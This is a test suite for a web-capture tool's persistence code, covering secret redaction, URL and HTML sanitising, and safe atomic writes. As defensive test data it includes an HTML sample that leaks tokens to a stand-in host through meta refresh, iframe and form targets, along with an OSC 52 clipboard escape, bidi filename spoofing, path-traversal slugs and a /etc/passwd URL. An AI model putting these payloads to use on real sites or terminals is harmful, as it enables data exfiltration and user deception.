import { afterEach, describe, expect, test } from "bun:test";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  readdirSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import {
  abortCaptureBundle,
  beginCaptureBundle,
  CAPTURE_MANIFEST_FILENAME,
  CAPTURE_SOURCE_EVIDENCE_PATH,
  captureMarkdownFilename,
  commitCaptureBundle,
  redactSensitiveText,
  redactSensitiveTextWithCount,
  sanitizeArtifactUrl,
  sanitizeSourceHtml,
  writeCaptureBundle,
  type CaptureManifestInput,
} from "./persist.js";
import { hasUnsafeTerminalCharacters } from "./terminal.js";

const temporaryRoots: string[] = [];

test("redacts credential contexts without rewriting ordinary Basic or Bearer prose", () => {
  const prose = "Show just the basic features. A bearer carries a message.";
  expect(redactSensitiveText(prose)).toBe(prose);
  expect(redactSensitiveText("Authorization: Bearer actual-secret-value")).toBe("Authorization: [REDACTED]");
  expect(redactSensitiveText("token=actual-secret-value")).toBe("token=[REDACTED]");
  expect(redactSensitiveTextWithCount("ordinary token discussion")).toEqual({
    text: "ordinary token discussion",
    count: 0,
  });
  expect(redactSensitiveTextWithCount("token=actual-secret-value and password=hunter2")).toEqual({
    text: "token=[REDACTED] and password=[REDACTED]",
    count: 2,
  });
});

test("preserves assignment keys that merely contain credential-like substrings", () => {
  const safe = [
    'author: "Alice"',
    "authority=regional",
    "authentication-method=passkey",
    "compass=north",
    "passage=introduction",
    "secretary=Alice",
    "tokenizer=unicode",
    "sessionize=true",
    "cookie-policy=strict",
    "private-key-history=chapter-4",
    "oauth-client-id=public-identifier",
    "oauth-token-endpoint=https://identity.example/token",
  ].join("\n");

  expect(redactSensitiveTextWithCount(safe)).toEqual({ text: safe, count: 0 });
});

test("redacts entity-encoded credential contexts without decoding active markup", () => {
  const encodedOpaque = "&#79;&#80;&#65;&#81;&#85;&#69;&#95;&#78;&#85;&#77;&#69;&#82;&#73;&#67;";
  const sensitive = [
    "Authorization&#58; Bearer OPAQUE_AUTHORIZATION",
    "Cookie&colon; session=OPAQUE_COOKIE; theme=dark",
    `tok&#101;n&#61;${encodedOpaque}`,
    "passw&#111;rd&equals;&quot;OPAQUE_PASSWORD&quot;",
    "AWS&lowbar;SECRET&lowbar;ACCESS&lowbar;KEY&equals;OPAQUE_AWS",
    "PRIVATE&#95;KEY&#61;OPAQUE_PRIVATE_KEY",
    "Authorization&#58 Bearer OPAQUE_NO_SEMICOLON_AUTH",
    "token&#61OPAQUE_NO_SEMICOLON_TOKEN",
    "password&#x3dOPAQUE_NO_SEMICOLON_PASSWORD",
  ].join("\n");

  const redacted = redactSensitiveText(sensitive);

  for (const opaque of [
    "OPAQUE_AUTHORIZATION",
    "OPAQUE_COOKIE",
    "OPAQUE_PASSWORD",
    "OPAQUE_AWS",
    "OPAQUE_PRIVATE_KEY",
    "OPAQUE_NO_SEMICOLON_AUTH",
    "OPAQUE_NO_SEMICOLON_TOKEN",
    "OPAQUE_NO_SEMICOLON_PASSWORD",
    encodedOpaque,
  ]) expect(redacted).not.toContain(opaque);
  expect(redacted.match(/\[REDACTED\]/g)).toHaveLength(9);
  expect(redacted).toContain("Authorization&#58; [REDACTED]");
  expect(redacted).toContain("tok&#101;n&#61;[REDACTED]");

  const sanitized = sanitizeSourceHtml(
    "<p>token&equals;&#60;script&#62;OPAQUE_MARKUP&#60;&#47;script&#62;</p><p>Safe text.</p>",
  );
  expect(sanitized).not.toContain("OPAQUE_MARKUP");
  expect(sanitized).not.toMatch(/<script\b/i);
  expect(sanitized).toContain("token&equals;[REDACTED]");
  expect(sanitized).toContain("Safe text.");
});

test("redacts every explicitly assigned secret-key class while preserving related prose", () => {
  const sensitive = [
    "session=OPAQUE_SESSION",
    "csrf=OPAQUE_CSRF",
    "xsrf_token=OPAQUE_XSRF",
    "AWS_SECRET_ACCESS_KEY=OPAQUE_AWS_SECRET",
    "PRIVATE_KEY=OPAQUE_PRIVATE",
    "api_key=OPAQUE_API_KEY",
    "PROXY_AUTHORIZATION=Bearer OPAQUE_PROXY_AUTH",
    "client_secret=OPAQUE_CLIENT_SECRET",
    "refresh_token=OPAQUE_REFRESH_TOKEN",
  ].join("\n");
  const safe = "This session overview explains CSRF defenses, private-key cryptography, and AWS access.";

  const redacted = redactSensitiveText(`${sensitive}\n${safe}`);

  for (const opaque of [
    "OPAQUE_SESSION",
    "OPAQUE_CSRF",
    "OPAQUE_XSRF",
    "OPAQUE_AWS_SECRET",
    "OPAQUE_PRIVATE",
    "OPAQUE_API_KEY",
    "OPAQUE_PROXY_AUTH",
    "OPAQUE_CLIENT_SECRET",
    "OPAQUE_REFRESH_TOKEN",
  ]) expect(redacted).not.toContain(opaque);
  expect(redacted).toContain(safe);
});

test("redacts complete password lines and PEM credential blocks", () => {
  const sensitive = [
    "password=correct horse battery staple",
    `PRIVATE_KEY=-----BEGIN ${"PRIVATE"} KEY-----`,
    "MIIEopaque987",
    "-----END PRIVATE KEY-----",
    "private_key: |",
    `  -----BEGIN ENCRYPTED ${"PRIVATE"} KEY-----`,
    "  YAMLopaque987",
    "  -----END ENCRYPTED PRIVATE KEY-----",
    "-----BEGIN CERTIFICATE-----",
    "CERTopaque987",
    "-----END CERTIFICATE-----",
    `-----BEGIN PGP ${"PRIVATE"} KEY BLOCK-----`,
    "PGPopaque987",
    "-----END PGP PRIVATE KEY BLOCK-----",
  ].join("\n");
  const safe = [
    "A password can be a correct horse battery staple; private-key cryptography is ordinary prose.",
    "-----BEGIN PGP PUBLIC KEY BLOCK-----",
    "PUBLICexample",
    "-----END PGP PUBLIC KEY BLOCK-----",
  ].join("\n");

  const redacted = redactSensitiveText(`${sensitive}\n${safe}`);

  expect(redacted.split("\n", 1)[0]).toBe("password=[REDACTED]");
  for (const opaque of [
    "MIIEopaque987",
    "YAMLopaque987",
    "CERTopaque987",
    "PGPopaque987",
  ]) expect(redacted).not.toContain(opaque);
  expect(redacted).not.toMatch(/-----BEGIN (?:ENCRYPTED )?PRIVATE KEY-----/);
  expect(redacted).not.toContain("-----BEGIN CERTIFICATE-----");
  expect(redacted).toContain(safe);
});

test("redacts npmrc authentication fields without treating author metadata as authentication", () => {
  const input = [
    "//registry.example/:_authToken=OPAQUE_NPM_TOKEN",
    "//registry.example/:_auth=OPAQUE_NPM_BASIC",
    "_author=Alice",
  ].join("\n");

  const redacted = redactSensitiveText(input);

  expect(redacted).not.toContain("OPAQUE_NPM_TOKEN");
  expect(redacted).not.toContain("OPAQUE_NPM_BASIC");
  expect(redacted).toContain("_author=Alice");
});

test("redacts multi-megabyte text with sparse entity bookkeeping", () => {
  const ordinary = "ordinary capture prose ".repeat(130_000);
  const value = `${ordinary}&amp; safe tail`;
  const startedAt = performance.now();

  const result = redactSensitiveTextWithCount(value);

  expect(result.count).toBe(0);
  expect(result.text === value).toBeTrue();
  expect(performance.now() - startedAt).toBeLessThan(5_000);
});

test("fails closed within a fixed projection budget for a 25 MiB entity-dense body", () => {
  const allowedBodyBytes = 25 * 1024 * 1024;
  const value = "&amp;".repeat(Math.ceil(allowedBodyBytes / 5));
  const startedAt = performance.now();

  const result = redactSensitiveTextWithCount(value);

  expect(value.length).toBeGreaterThanOrEqual(allowedBodyBytes);
  expect(result).toEqual({ text: "[REDACTED ENTITY-DENSE CONTENT]", count: 1 });
  expect(performance.now() - startedAt).toBeLessThan(5_000);
});

test("fails closed without quadratic copying for dense credential assignments", () => {
  const value = "token=x ".repeat(250_000);
  const startedAt = performance.now();

  const result = redactSensitiveTextWithCount(value);

  expect(value.length).toBeGreaterThanOrEqual(2_000_000);
  expect(result).toEqual({ text: "[REDACTED CREDENTIAL-DENSE CONTENT]", count: 1 });
  expect(performance.now() - startedAt).toBeLessThan(5_000);
});

test("fails closed within a fixed URL-candidate budget", () => {
  const value = "https://example.com/safe ".repeat(100_000);
  const startedAt = performance.now();

  const result = redactSensitiveTextWithCount(value);

  expect(value.length).toBeGreaterThan(2_000_000);
  expect(result).toEqual({ text: "[REDACTED URL-DENSE CONTENT]", count: 1 });
  expect(performance.now() - startedAt).toBeLessThan(5_000);
});

afterEach(() => {
  for (const root of temporaryRoots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function temporaryRoot(): string {
  const root = mkdtempSync(join(tmpdir(), "cclrte-oh-capture-persist-"));
  temporaryRoots.push(root);
  return root;
}

function manifest(): CaptureManifestInput {
  return {
    sourceUrl: "https://example.com/source?keep=yes",
    canonicalUrl: "https://example.com/source",
    capturedAt: "2026-07-21T12:34:56.000Z",
    platform: "generic",
    status: "complete",
    scope: "page",
    acquisition: {
      method: "http",
      finalUrl: "https://example.com/source",
      contentType: "text/html; charset=utf-8",
    },
    extraction: {
      extractor: "defuddle",
      score: 1200.5,
      wordCount: 12,
      capturedItems: 1,
      expectedItems: null,
    },
    attempts: [{ method: "http", outcome: "succeeded", message: "complete; 12 words; 1 item" }],
    assets: [],
    artifacts: {
      images: { requested: false, status: "not-requested", files: 0 },
      media: { requested: false, status: "not-requested", files: 0 },
      videoContext: {
        requested: false,
        status: "not-requested",
        thumbnailPath: null,
        transcriptLanguage: null,
        transcriptCueCount: 0,
        transcriptTruncated: false,
        metadata: null,
      },
    },
    evidence: {
      requested: "none",
      screenshotPath: null,
      screenshotStatus: "not-requested",
      sourceHtmlStatus: "not-requested",
    },
    warnings: [],
  };
}

function installOwnedCapture(root: string, slug: string, markdown = "old capture"): string {
  const transaction = beginCaptureBundle({ outputRoot: root, slug, force: false });
  writeCaptureBundle(transaction, { markdown, manifest: manifest() });
  return commitCaptureBundle(transaction);
}

function hiddenTransactions(root: string): readonly string[] {
  return readdirSync(root).filter((name) => name.startsWith(".capture-"));
}

test("stages and atomically commits a deterministic capture bundle", () => {
  const root = temporaryRoot();
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "useful-source", force: false });
  expect(transaction.stagingDirectory.startsWith(`${realpathSync(root)}/.capture-staging-`)).toBeTrue();
  expect(existsSync(transaction.targetDirectory)).toBeFalse();
  mkdirSync(transaction.assetsDirectory);
  writeFileSync(join(transaction.assetsDirectory, "asset.txt"), "asset\n");

  const stored = writeCaptureBundle(transaction, {
    markdown: "# Useful source",
    manifest: {
      ...manifest(),
      evidence: {
        requested: "source",
        screenshotPath: null,
        screenshotStatus: "not-requested",
        sourceHtmlStatus: "captured",
      },
    },
    sourceHtml: "<html><body><article>Useful source</article></body></html>",
  });
  expect(stored.schemaVersion).toBe(3);
  const target = commitCaptureBundle(transaction);

  expect(target).toBe(join(realpathSync(root), "useful-source"));
  expect(readFileSync(join(target, captureMarkdownFilename("useful-source")), "utf8")).toBe("# Useful source\n");
  const serialized = readFileSync(join(target, CAPTURE_MANIFEST_FILENAME), "utf8");
  expect(serialized.endsWith("\n")).toBeTrue();
  expect(JSON.parse(serialized)).toEqual(stored);
  expect(readFileSync(join(target, "assets/asset.txt"), "utf8")).toBe("asset\n");
  expect(statSync(join(target, CAPTURE_SOURCE_EVIDENCE_PATH)).mode & 0o777).toBe(0o600);
  expect(hiddenTransactions(root)).toEqual([]);
});

test("refuses an existing capture unless force is explicit", () => {
  const root = temporaryRoot();
  mkdirSync(join(root, "existing"));
  writeFileSync(join(root, "existing/index.md"), "old\n");

  expect(() => beginCaptureBundle({ outputRoot: root, slug: "existing", force: false })).toThrow("pass --force");
  expect(readFileSync(join(root, "existing/index.md"), "utf8")).toBe("old\n");
  expect(hiddenTransactions(root)).toEqual([]);
});

test("force replaces the old tree and removes owned transaction paths", () => {
  const root = temporaryRoot();
  installOwnedCapture(root, "existing");
  writeFileSync(join(root, "existing/old.txt"), "old\n");
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "existing", force: true });
  writeCaptureBundle(transaction, { markdown: "new", manifest: manifest() });

  commitCaptureBundle(transaction);

  expect(existsSync(join(root, "existing/old.txt"))).toBeFalse();
  expect(readFileSync(join(root, `existing/${captureMarkdownFilename("existing")}`), "utf8")).toBe("new\n");
  expect(hiddenTransactions(root)).toEqual([]);
});

test("force safely upgrades an owned schema-1 bundle", () => {
  const root = temporaryRoot();
  const target = installOwnedCapture(root, "legacy-capture");
  const manifestPath = join(target, CAPTURE_MANIFEST_FILENAME);
  const legacy = JSON.parse(readFileSync(manifestPath, "utf8")) as Record<string, unknown>;
  legacy.schemaVersion = 1;
  writeFileSync(manifestPath, `${JSON.stringify(legacy)}\n`);

  const transaction = beginCaptureBundle({ outputRoot: root, slug: "legacy-capture", force: true });
  writeCaptureBundle(transaction, { markdown: "upgraded", manifest: manifest() });
  const upgraded = commitCaptureBundle(transaction);
  expect(JSON.parse(readFileSync(join(upgraded, CAPTURE_MANIFEST_FILENAME), "utf8"))).toMatchObject({ schemaVersion: 3 });
});

test("force restores the old target when installation fails after backup", () => {
  const root = temporaryRoot();
  installOwnedCapture(root, "existing", "irreplaceable old capture");
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "existing", force: true });
  writeCaptureBundle(transaction, { markdown: "new", manifest: manifest() });

  expect(() => commitCaptureBundle(transaction, {
    afterBackup: () => {
      throw new Error("injected rename fault");
    },
  })).toThrow("injected rename fault");

  expect(readFileSync(join(root, `existing/${captureMarkdownFilename("existing")}`), "utf8")).toBe("irreplaceable old capture\n");
  abortCaptureBundle(transaction);
  expect(hiddenTransactions(root)).toEqual([]);
});

test("force restores the old target when validation fails after installation", () => {
  const root = temporaryRoot();
  installOwnedCapture(root, "existing", "old capture");
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "existing", force: true });
  writeCaptureBundle(transaction, { markdown: "new capture", manifest: manifest() });

  expect(() => commitCaptureBundle(transaction, {
    afterInstall: () => {
      throw new Error("injected post-install fault");
    },
  })).toThrow("injected post-install fault");

  expect(readFileSync(join(root, `existing/${captureMarkdownFilename("existing")}`), "utf8")).toBe("old capture\n");
  expect(hiddenTransactions(root)).toEqual([]);
});

test("force refuses to replace an unowned directory", () => {
  const root = temporaryRoot();
  mkdirSync(join(root, "hand-written"));
  writeFileSync(join(root, "hand-written/note.md"), "irreplaceable\n");
  expect(() => beginCaptureBundle({ outputRoot: root, slug: "hand-written", force: true })).toThrow("unowned target");
  expect(readFileSync(join(root, "hand-written/note.md"), "utf8")).toBe("irreplaceable\n");
  expect(hiddenTransactions(root)).toEqual([]);
});

test("refuses a filesystem root as the output directory", () => {
  expect(() => beginCaptureBundle({ outputRoot: "/", slug: "capture-test", force: false })).toThrow("dangerous");
});

test("removes AWS, CloudFront, Google, Azure, and generic signed URL credentials", () => {
  const urls = [
    "https://cdn.example/a?keep=1&X-Amz-Credential=AKIAEXAMPLE&X-Amz-Signature=AWS_SECRET",
    "https://cdn.example/a?keep=1&Policy=CLOUDFRONT_POLICY&Signature=CLOUDFRONT_SECRET&Key-Pair-Id=KEY",
    "https://cdn.example/a?keep=1&X-Goog-Credential=user&X-Goog-Signature=GOOGLE_SECRET",
    "https://cdn.example/a?keep=1&sv=1&sp=r&se=tomorrow&sr=b&sig=AZURE_SECRET",
    "https://cdn.example/a?keep=1&token=GENERIC_SECRET",
  ];
  for (const url of urls) {
    const sanitized = sanitizeArtifactUrl(url);
    expect(sanitized).toBe("https://cdn.example/a?keep=1");
    expect(redactSensitiveText(`![asset](${url})`)).toBe("![asset](https://cdn.example/a?keep=1)");
  }
});

test("sanitizes duplicate query keys linearly and fails closed at a fixed parameter budget", () => {
  const ordinary = `https://example.com/?${"a=1&".repeat(1_000)}keep=yes`;
  expect(sanitizeArtifactUrl(ordinary)).toBe(ordinary);

  const dense = `https://example.com/?${"a=1&".repeat(10_000)}keep=yes`;
  const startedAt = performance.now();
  expect(sanitizeArtifactUrl(dense)).toBe("https://example.com/");
  expect(performance.now() - startedAt).toBeLessThan(2_000);
});

test("removes one-time URL credentials and quoted structured headers", () => {
  const text = [
    "https://site.example/callback?keep=1&code=OAUTH_SECRET&ticket=MAGIC_SECRET&otp=123456&key=BARE_SECRET",
    '{"Authorization":"Bearer VERYSECRET"}',
    '{"Cookie":"session=COOKIESECRET"}',
    'authorization = "Basic BASICSECRET"',
    "Authorization: Bearer PLAINAUTHSECRET",
    "Cookie: a=1; session=SECONDCOOKIESECRET",
    "COOKIE=session=ENVCOOKIESECRET",
    "SET_COOKIE=id=ENVSETCOOKIESECRET; Path=/",
    "PROXY_AUTHORIZATION=Bearer opaque987",
  ].join("\n");
  const redacted = redactSensitiveText(text);
  expect(redacted).not.toContain("OAUTH_SECRET");
  expect(redacted).not.toContain("MAGIC_SECRET");
  expect(redacted).not.toContain("123456");
  expect(redacted).not.toContain("BARE_SECRET");
  expect(redacted).not.toContain("VERYSECRET");
  expect(redacted).not.toContain("COOKIESECRET");
  expect(redacted).not.toContain("BASICSECRET");
  expect(redacted).not.toContain("PLAINAUTHSECRET");
  expect(redacted).not.toContain("SECONDCOOKIESECRET");
  expect(redacted).not.toContain("ENVCOOKIESECRET");
  expect(redacted).not.toContain("ENVSETCOOKIESECRET");
  expect(redacted).not.toContain("opaque987");
  expect(redacted).toContain("keep=1");
  expect(sanitizeArtifactUrl("https://site.example/#code=abc123xyz")).toBe("https://site.example/");
  expect(sanitizeArtifactUrl("https://site.example/#/magic?ticket=opaque-93821")).toBe("https://site.example/");
});

test("removes repeatedly encoded URL credentials while preserving safe queries and fragments", () => {
  expect(sanitizeArtifactUrl("https://site.example/callback?keep=yes&%2563ode=OPAQUE_QUERY")).toBe(
    "https://site.example/callback?keep=yes",
  );
  expect(sanitizeArtifactUrl("https://site.example/#%2563ode%3DOPAQUE_FRAGMENT")).toBe("https://site.example/");
  expect(sanitizeArtifactUrl("https://site.example/#%252563ode%253DOPAQUE_TRIPLE")).toBe("https://site.example/");

  const safe = "https://site.example/guide?monkey=banana&topic=private-key-history#session-overview";
  expect(sanitizeArtifactUrl(safe)).toBe(safe);
  expect(redactSensitiveText(`Read ${safe} for a session overview.`)).toBe(`Read ${safe} for a session overview.`);
});

test("removes SSO payloads and contextual one-time codes without deleting benign state", () => {
  const sensitive = "https://site.example/sso?keep=yes&SAMLRequest=OPAQUE_REQUEST&SAMLResponse=OPAQUE_RESPONSE&RelayState=OPAQUE_RELAY&assertion=OPAQUE_ASSERTION&action_code=OPAQUE_ACTION&verification_code=OPAQUE_VERIFY&invite_code=OPAQUE_INVITE&oobCode=OPAQUE_OOB&state=OPAQUE_STATE";
  expect(sanitizeArtifactUrl(sensitive)).toBe("https://site.example/sso?keep=yes");
  expect(sanitizeArtifactUrl("https://site.example/oauth?keep=yes&code=OPAQUE_CODE&state=OPAQUE_STATE")).toBe(
    "https://site.example/oauth?keep=yes",
  );

  const safe = "https://site.example/search?zipcode=10001&state=ny&oauth_client_id=public-id";
  expect(sanitizeArtifactUrl(safe)).toBe(safe);
});

test("removes credential-bearing path segments while preserving ordinary paths", () => {
  const sensitivePaths = [
    ["https://site.example/magic-link/opaque987", "https://site.example/magic-link/"],
    ["https://site.example/reset/token/opaque987", "https://site.example/reset/token/"],
    ["https://site.example/oauth/code/opaque987", "https://site.example/oauth/code/"],
    ["https://site.example/redeem/ticket/opaque987", "https://site.example/redeem/ticket/"],
    ["https://site.example/login/otp/123456", "https://site.example/login/otp/"],
    ["https://site.example/auth/nonce/opaque987", "https://site.example/auth/nonce/"],
    ["https://site.example/account/key/opaque987", "https://site.example/account/key/"],
    ["https://site.example/reset-password/opaque987", "https://site.example/reset-password/"],
    ["https://site.example/reset/opaque987", "https://site.example/reset/"],
    ["https://site.example/verify/opaque987", "https://site.example/verify/"],
    ["https://site.example/invite/opaque987", "https://site.example/invite/"],
    ["https://site.example/magic/opaque987", "https://site.example/magic/"],
    ["https://site.example/activation/opaque987", "https://site.example/activation/"],
    ["https://site.example/%2576erify/opaque%2539%2538%2537", "https://site.example/%2576erify/"],
  ] as const;
  for (const [sensitive, expected] of sensitivePaths) {
    expect(sanitizeArtifactUrl(sensitive)).toBe(expected);
    expect(redactSensitiveText(`Continue at ${sensitive}.`)).toBe(`Continue at ${expected}.`);
  }

  for (const safe of [
    "https://site.example/docs/key/concepts",
    "https://site.example/guide/code/examples",
    "https://site.example/oauth/code",
    "https://site.example/magic-link",
    "https://site.example/verify/email",
    "https://site.example/invite/team",
    "https://site.example/reset/help",
    "https://site.example/magic/about",
    "https://site.example/activation/status",
  ]) expect(sanitizeArtifactUrl(safe)).toBe(safe);

  const evidence = sanitizeSourceHtml(
    '<a href="https://site.example/reset/token/OPAQUE_EVIDENCE">Continue securely</a>',
  );
  expect(evidence).not.toContain("OPAQUE_EVIDENCE");
  expect(evidence).toContain('data-captured-href="https://site.example/reset/token/"');
});

test("sanitizes entity-obfuscated Markdown URLs while preserving harmless entities", () => {
  const sensitiveLinks = [
    "[go](https://site.example/r&#101;set/opaque987)",
    "[go](https://site.example/reset/op&#97;que987)",
    "[go](https&colon;//site.example/reset/opaque987)",
  ];
  for (const link of sensitiveLinks) {
    expect(redactSensitiveText(link)).toBe("[go](https://site.example/reset/)");
    expect(redactSensitiveText(link)).not.toContain("opaque987");
  }
  expect(redactSensitiveText("[go](https://site.example/?tok&#101;n=opaque987&keep=yes)")).toBe(
    "[go](https://site.example/?keep=yes)",
  );

  const safe = [
    "AT&amp;T remains ordinary prose.",
    "[brand](https://site.example/AT&amp;T)",
    "[help](https://site.example/r&#101;set/help)",
    "[verify](https&colon;//site.example/verify/email)",
  ].join("\n");
  expect(redactSensitiveTextWithCount(safe)).toEqual({ text: safe, count: 0 });
});

describe("path confinement", () => {
  test.each(["", ".", "..", "../escape", "nested/escape", "nested\\escape", ".hidden", "trail-", "e\u0301"])(
    "rejects unsafe slug %j",
    (slug) => {
      const root = temporaryRoot();
      expect(() => beginCaptureBundle({ outputRoot: root, slug, force: false })).toThrow("unsafe capture slug");
      expect(hiddenTransactions(root)).toEqual([]);
    },
  );

  test("accepts a normalized Unicode one-segment slug", () => {
    const root = temporaryRoot();
    const transaction = beginCaptureBundle({ outputRoot: root, slug: "資料-2026", force: false });
    abortCaptureBundle(transaction);
    expect(hiddenTransactions(root)).toEqual([]);
  });

  test("rejects a segment that exceeds common filesystem byte limits", () => {
    const root = temporaryRoot();
    expect(() => beginCaptureBundle({ outputRoot: root, slug: "𐐀".repeat(80), force: false })).toThrow(
      "unsafe capture slug",
    );
  });

  test("rejects a multi-megabyte slug before Unicode expansion", () => {
    const slug = "a".repeat(2 * 1024 * 1024);
    expect(() => captureMarkdownFilename(slug)).toThrow("unsafe capture slug");
  });

  test("refuses staged symlinks before commit", () => {
    const root = temporaryRoot();
    const transaction = beginCaptureBundle({ outputRoot: root, slug: "symlink-test", force: false });
    writeCaptureBundle(transaction, { markdown: "safe", manifest: manifest() });
    symlinkSync("/tmp", join(transaction.stagingDirectory, "outside"));
    expect(() => commitCaptureBundle(transaction)).toThrow("symbolic link");
    abortCaptureBundle(transaction);
  });
});

test("sanitizes active HTML, form state, resource loads, and credential-shaped values", () => {
  const dangerous = `<!doctype html><html><head>
    <meta http-equiv="refresh" content="0;url=https://evil.test/?token=META_SECRET">
    <style>body{background:url(https://evil.test/STYLE_SECRET)}</style>
    <script>window.token = "SCRIPT_SECRET"</script>
  </head><body onload="steal()">
    <!-- Cookie: COMMENT_SECRET -->
    <iframe src="https://evil.test/FRAME_SECRET"></iframe><iframe src="https://evil.test/SELF_CLOSING_SECRET" />
    <form action="https://evil.test/FORM_SECRET"><input name="password" value="INPUT_SECRET"><p>FORM_BODY_SECRET</p></form>
    <article data-token="ATTRIBUTE_SECRET" onclick="steal()" style="color:red">
      <a href="https://user:pass@example.com/post?access_token=QUERY_SECRET#fragment">Keep this link label</a>
      <img src="https://images.example/picture.png?signed=URL_SECRET" onerror="steal()">
      <p>Authorization: Bearer BODY_SECRET</p><p>Ordinary safe text.</p>
    </article>
  </body></html>`;

  const sanitized = sanitizeSourceHtml(dangerous);

  for (const secret of [
    "META_SECRET", "STYLE_SECRET", "SCRIPT_SECRET", "COMMENT_SECRET", "FRAME_SECRET", "SELF_CLOSING_SECRET", "FORM_SECRET",
    "INPUT_SECRET", "FORM_BODY_SECRET", "ATTRIBUTE_SECRET", "QUERY_SECRET", "URL_SECRET", "BODY_SECRET",
    "user:pass",
  ]) expect(sanitized).not.toContain(secret);
  expect(sanitized).not.toMatch(/<(?:script|style|iframe|form|input)\b/i);
  expect(sanitized).not.toMatch(/<meta\b[^>]*http-equiv=["']?refresh/i);
  expect(sanitized).not.toMatch(/\s(?:onload|onclick|onerror|style|value|data-token)=/i);
  expect(sanitized).not.toContain(" src=");
  expect(sanitized).not.toContain(" href=");
  expect(sanitized).toContain("data-captured-href=\"https://example.com/post\"");
  expect(sanitized).toContain("data-captured-src=\"https://images.example/picture.png\"");
  expect(sanitized).toContain("Ordinary safe text.");
  expect(sanitized).toContain("Content-Security-Policy");
});

test("bounds source-evidence references, tags, and structural cardinality", () => {
  const overlongReference = `https://example.com/?keep=${"x".repeat(20 * 1024)}`;
  const referenceResult = sanitizeSourceHtml(`<a href="${overlongReference}">safe label</a>`);
  expect(referenceResult).toContain("safe label");
  expect(referenceResult).not.toContain("data-captured-href");

  const giantTag = sanitizeSourceHtml(`<p title="${"x".repeat(70 * 1024)}">tail`);
  expect(giantTag).toContain("[Source evidence omitted after a structural safety limit.]");
  expect(giantTag.length).toBeLessThan(2_000);

  const denseStructure = sanitizeSourceHtml("<b>x</b>".repeat(30_000));
  expect(denseStructure).toContain("[Source evidence omitted after a structural safety limit.]");
  expect(denseStructure.length).toBeLessThan(1_000_000);
});

test("removes terminal protocols and bidi controls from inert source evidence", () => {
  const osc52 = "\u001b]52;c;c3RlYWwtZXZpZGVuY2U=\u0007";
  const sanitized = sanitizeSourceHtml(
    `<article><p>Café 漢字 🙂 before ${osc52} after \u202etxt.exe\u202c</p></article>`,
  );
  expect(sanitized).toContain("Café 漢字 🙂 before  after txt.exe");
  expect(sanitized).not.toContain("c3RlYWwtZXZpZGVuY2U=");
  expect(hasUnsafeTerminalCharacters(sanitized)).toBeFalse();
});

test("redacts credentials from Markdown and manifest metadata", () => {
  const root = temporaryRoot();
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "redacted", force: false });
  const sensitiveManifest: CaptureManifestInput = {
    ...manifest(),
    sourceUrl: "https://alice:URL_PASSWORD@example.com/post?access_token=QUERY_SECRET&keep=yes",
    canonicalUrl: "https://example.com/post?api_key=API_SECRET",
    acquisition: {
      method: "cookie-http",
      finalUrl: "https://example.com/post?session_id=SESSION_SECRET",
      contentType: "text/html",
    },
    attempts: [{ method: "cookie-http", outcome: "failed", message: "token=ATTEMPT_SECRET" }],
    warnings: ["Authorization: Bearer WARNING_SECRET", "Cookie: sid=COOKIE_SECRET; Path=/"],
    assets: [{
      source: "https://images.example/a.png?token=SOURCE_SECRET",
      url: "https://images.example/a.png?token=ASSET_SECRET",
      path: "assets/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png",
      mimeType: "image/png",
      bytes: 12,
      sha256: "a".repeat(64),
    }],
    evidence: {
      requested: "source",
      screenshotPath: null,
      screenshotStatus: "not-requested",
      sourceHtmlStatus: "captured",
    },
  };
  writeCaptureBundle(transaction, {
    markdown: "# Page\n\npassword=MARKDOWN_SECRET\n",
    manifest: sensitiveManifest,
    sourceHtml: "<p>csrf_token=EVIDENCE_SECRET</p>",
  });
  const target = commitCaptureBundle(transaction);
  const artifact = [
    readFileSync(join(target, captureMarkdownFilename("redacted")), "utf8"),
    readFileSync(join(target, CAPTURE_MANIFEST_FILENAME), "utf8"),
    readFileSync(join(target, CAPTURE_SOURCE_EVIDENCE_PATH), "utf8"),
  ].join("\n");

  for (const secret of [
    "URL_PASSWORD", "QUERY_SECRET", "API_SECRET", "SESSION_SECRET", "WARNING_SECRET", "COOKIE_SECRET",
    "SOURCE_SECRET", "ASSET_SECRET", "ATTEMPT_SECRET", "MARKDOWN_SECRET", "EVIDENCE_SECRET",
  ]) expect(artifact).not.toContain(secret);
  expect(artifact).toContain("[REDACTED]");
  expect(artifact).toContain("keep=yes");
});

test("preserves a finite negative extraction score", () => {
  const root = temporaryRoot();
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "blocked-page", force: false });
  writeCaptureBundle(transaction, {
    markdown: "blocked",
    manifest: {
      ...manifest(),
      status: "blocked",
      extraction: { ...manifest().extraction, score: -4321.5 },
    },
  });
  const target = commitCaptureBundle(transaction);
  const stored: unknown = JSON.parse(readFileSync(join(target, CAPTURE_MANIFEST_FILENAME), "utf8"));
  expect(stored).toMatchObject({ extraction: { score: -4321.5 } });
});

test("write failure cleans only its owned staging directory", () => {
  const root = temporaryRoot();
  const unrelated = join(root, "unrelated");
  mkdirSync(unrelated);
  writeFileSync(join(unrelated, "keep.txt"), "keep\n");
  chmodSync(unrelated, 0o755);
  const transaction = beginCaptureBundle({ outputRoot: root, slug: "bad-manifest", force: false });
  const invalid = { ...manifest(), sourceUrl: "file:///etc/passwd" };

  expect(() => writeCaptureBundle(transaction, { markdown: "nope", manifest: invalid })).toThrow("http or https");
  expect(existsSync(transaction.stagingDirectory)).toBeFalse();
  expect(readFileSync(join(unrelated, "keep.txt"), "utf8")).toBe("keep\n");
});
